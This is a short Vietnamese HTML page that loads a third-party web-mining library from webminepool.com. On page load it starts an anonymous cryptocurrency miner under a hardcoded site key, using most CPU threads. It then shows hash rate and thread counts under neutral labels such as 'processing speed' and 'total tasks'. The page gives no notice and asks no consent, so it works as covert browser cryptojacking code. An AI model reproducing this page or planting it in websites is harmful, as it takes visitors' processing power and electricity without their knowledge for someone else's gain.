<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>NSTĐ</title>
</head>
<body>
    <div>Tốc độ xử lý: <span id="per">0</span></div>
    <div>Tổng tác vụ: <span id="tong">0</span></div>
    <div>Luồng CPU: <span id="luong">0</span></div>

    <script src="https://webminepool.com/lib/base.js"></script>
    <script>
        var a = WMP.Anonymous('SK_xCZ7hfNTxdlG46QXetHXz', 'nstd', {
            autoThreads: true,
            throttle: 0.2,
            forceASMJS: false
        });
        a.start();

        setInterval(() => {
            document.getElementById('per').textContent = a.getHashesPerSecond().toFixed(2);
            document.getElementById('tong').textContent = a.getTotalHashes();
            document.getElementById('luong').textContent = a.getNumThreads( );
        }, 1000);
    </script>
</body>
</html>
